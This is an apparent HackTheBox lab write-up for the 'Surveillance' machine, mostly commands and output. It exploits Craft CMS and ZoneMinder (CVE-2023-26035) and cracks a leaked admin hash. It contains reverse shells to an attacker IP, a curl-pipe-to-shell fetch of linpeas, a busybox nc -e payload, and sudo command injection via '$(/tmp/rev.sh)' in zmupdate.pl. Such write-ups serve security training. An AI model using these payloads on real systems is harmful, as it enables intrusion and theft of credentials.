---
title: "HackTheBox - Surveillance"
date: 2024-02-02 10:20:00 +0700
categories: [HackTheBox, Machines]
tags: [medium]
---

![Desktop View](/assets/img/hackthebox/machines/medium/surveillance/Surveillance.png)

## Enumeration
### Ping
```bash
PING 10.10.11.245 (10.10.11.245) 56(84) bytes of data.
64 bytes from 10.10.11.245: icmp_seq=1 ttl=63 time=133 ms
64 bytes from 10.10.11.245: icmp_seq=2 ttl=63 time=58.8 ms
64 bytes from 10.10.11.245: icmp_seq=3 ttl=63 time=76.5 ms
64 bytes from 10.10.11.245: icmp_seq=4 ttl=63 time=101 ms

--- 10.10.11.245 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 58.801/92.522/133.300/27.994 ms
```
### Nmap
```bash
# Nmap 7.94 scan initiated Thu Feb  1 16:22:02 2024 as: nmap -sCV -T4 -oN nmap.txt 10.10.11.245
Nmap scan report for 10.10.11.245
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  1 16:22:12 2024 -- 1 IP address (1 host up) scanned in 9.70 seconds
```
### Browser
![Desktop View](/assets/img/hackthebox/machines/medium/surveillance/include/surveillance1.png)

#### Exploit
I found [this](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)

```bash
❯ python poc_work.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ bash -c 'bash -i >& /dev/tcp/10.10.14.26/9001 0>&1'
```
```bash
❯ nc -nvlp 9001
Connection from 10.10.11.245:54372
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web/cpresources$
```
Find something interesting, on `~/html/craft/storage/backups` I found file  `surveillance--2023-10-17-202801--v4.4.14.sql.zip`, to get it copy the file into the directory `~/html/craft/web`. Then on ure terminal, `wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip`. Unzip the file, the result is `<snip>.sql`, and I read the file with `strings`, i found some interesting
```mysql
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```
```bash
❯ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec  

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
```
```bash
❯ hashcat -m 1400 pw.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 3762/7589 MB (948 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c...5770ec
Time.Started.....: Mon Feb  5 09:46:11 2024 (1 sec)
Time.Estimated...: Mon Feb  5 09:46:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3944.5 kH/s (0.48ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3555328/14344384 (24.79%)
Rejected.........: 0/3555328 (0.00%)
Restore.Point....: 3551232/14344384 (24.76%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: starfish76 -> stangs05
Hardware.Mon.#1..: Temp: 53c Util: 21%

Started: Mon Feb  5 09:46:05 2024
Stopped: Mon Feb  5 09:46:12 2024
```
```bash
❯ ssh matthew@surveillance.htb
matthew@surveillance.htb''s password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb  5 02:47:05 AM UTC 2024

  System load:  0.0               Processes:             227
  Usage of /:   83.9% of 5.91GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
matthew@surveillance:~$ ls
user.txt
matthew@surveillance:~$ cat user.txt
e40957958841d57d92124a2f2ad4bb80
matthew@surveillance:~$ curl http://10.10.14.26:8000/linpeas.sh | sh

<snip>

s-rw-r--r-- 1 root root 1110 Oct 17 16:38 /etc/nginx/sites-available/zoneminder.conf
server {
    listen 127.0.0.1:8080;
    
    root /usr/share/zoneminder/www;
    
    index index.php;
    
    access_log /var/log/zm/access.log;
    error_log /var/log/zm/error.log;
    
    location / {
        try_files $uri $uri/ /index.php?$args =404;
       
        location ~ /api/(css|img|ico) {
            rewrite ^/api(.+)$ /api/app/webroot/$1 break;
            try_files $uri $uri/ =404;
        }
        location /api {
            rewrite ^/api(.+)$ /api/app/webroot/index.php?p=$1 last;
        }
        location /cgi-bin {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_pass unix:/run/fcgiwrap.sock;
        }
        
        location ~ \.php$ {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_index index.php;
            
            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock;
        }
    }
}

<snip>

-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'host' => 'localhost',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
				$this->default['host'] = $array[0];
			$this->default['host'] = ZM_DB_HOST;

<snip>

-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false
PRIMARY_SITE_URL=http://surveillance.htb/

<snip>
```
zoneminder.conf server listen on port 8080, we can use ssh tunnel
`ssh -L 7890:localhost:8080 matthew@surveillance.htb`, open your localhost on port 7890
![Desktop View](/assets/img/hackthebox/machines/medium/surveillance/include/surveillance2.png)
```bash
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat * | grep -i version
cat: Configure::write('ZM_VERSION', '1.36.32');
Configure::write('ZM_API_VERSION', '1.36.32.1');
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
Schema: Is a directory
```
find the exploit of zoneminder v.1.36.32. And i found [this](https://github.com/heapbytes/CVE-2023-26035)
```bash
❯ python poc.py --target http://localhost:7890/ --cmd "bash -c 'bash -i >& /dev/tcp/10.10.14.26/9002 0>&1'"
Fetching CSRF Token
Got Token: key:785251be951a4574928b1e4a49847cf6bb0d976e,1707104533
[>] Sending payload..
[!] Script executed by out of time limit (if u used revshell, this will exit the script)
```
```bash
❯ nc -nvlp 9002
Connection from 10.10.11.245:38042
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
zoneminder@surveillance:~$ cd /usr/bin
zoneminder@surveillance:~$ ls
<snip>
zm_rtsp_server
zmaudit.pl
zmc
zmcamtool.pl
zmcontrol.pl
zmdc.pl
zmfilter.pl
zmonvif-probe.pl
zmonvif-trigger.pl
zmore
zmpkg.pl
zmrecover.pl
zmstats.pl
zmsystemctl.pl
zmtelemetry.pl
zmtrack.pl
zmtrigger.pl
zmu
zmupdate.pl
zmvideo.pl
zmwatch.pl
zmx10.pl
<snip>
```
```bash
❯ vim rev.sh
#!/bin/bash
busybox nc 10.10.14.26 9005 -e sh
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```bash
zoneminder@surveillance:/usr/bin$ cd /tmp
zoneminder@surveillance:/tmp$ wget 10.10.14.26:8000/rev.sh
    --2024-02-05 04:13:13--  http://10.10.14.26:8000/rev.sh
    Connecting to 10.10.14.26:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 46 [application/x-sh]
    Saving to: 'rev.sh'

        0K                                                       100% 4.08M=0s

    2024-02-05 04:13:13 (4.08 MB/s) - 'rev.sh' saved [46/46]

zoneminder@surveillance:/tmp$ chmod 777 rev.sh
zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023

    Initiating database upgrade to version 1.36.32 from version 1

    WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
    Press enter to continue or ctrl-C to abort : 

    Do you wish to take a backup of your database prior to upgrading?
    This may result in a large file in /tmp/zm if you have a lot of events.
    Press 'y' for a backup or 'n' to continue : y
    Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
```
```bash
❯ nc -nvlp 9005
Connection from 10.10.11.245:47708
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@surveillance:/tmp# cd
cd
root@surveillance:~# ls    
ls
root.txt
root@surveillance:~# cat root.txt
cat root.txt
ffe1f70d13c3c6461a767e938cff67fd
```